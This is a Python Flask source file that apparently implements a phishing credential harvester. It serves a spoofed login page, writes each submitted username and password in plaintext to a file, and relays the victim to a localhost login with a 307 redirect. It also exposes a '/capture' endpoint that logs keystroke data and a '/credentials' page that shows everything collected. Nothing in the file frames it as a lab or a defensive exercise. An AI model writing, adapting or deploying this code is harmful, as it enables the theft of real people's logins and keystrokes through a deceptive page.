from flask import Flask, render_template, request, redirect, url_for
import os
import requests
app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login3.html')

@app.route('/submission', methods=['POST'])
def submission():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('credentials3.txt', 'a') as f:
        f.write(f'{username} {password}\n')

    if 'submit' in request.form:
       payload = {
        'username': username,
        'password': password,
        'submit': 'submit'
        }
       requests.post('http://localhost/', payload)
       return redirect("http://localhost/", code=307)
    elif 'customPage' in request.form:
        return render_template('custom2.html') 
    
@app.route('/capture', methods=['POST'])
def get_creds():
    data = request.get_json()
    if 'key' in data and 'fieldType' in data:
        key_data = data ['key']
        field_type = data['fieldType']

        with open('credentials3.txt', 'a') as f:
            f.write(f'{key_data} {field_type}\n')

        return {'status': 'success', 'message': 'Data captured'}
    else:
        return {'status': 'error', 'message': 'Missing data'}, 400
    
@app.route('/credentials')
def credentials():
    if os.path.exists('credentials3.txt'):
        with open('credentials3.txt', 'r') as f:
            return f.read().split('\n')
    else:
        data = 'No credentials found yet.'
    return render_template('credentials3.html', data=data)

if __name__ == '__main__':
    app.run(debug=True)

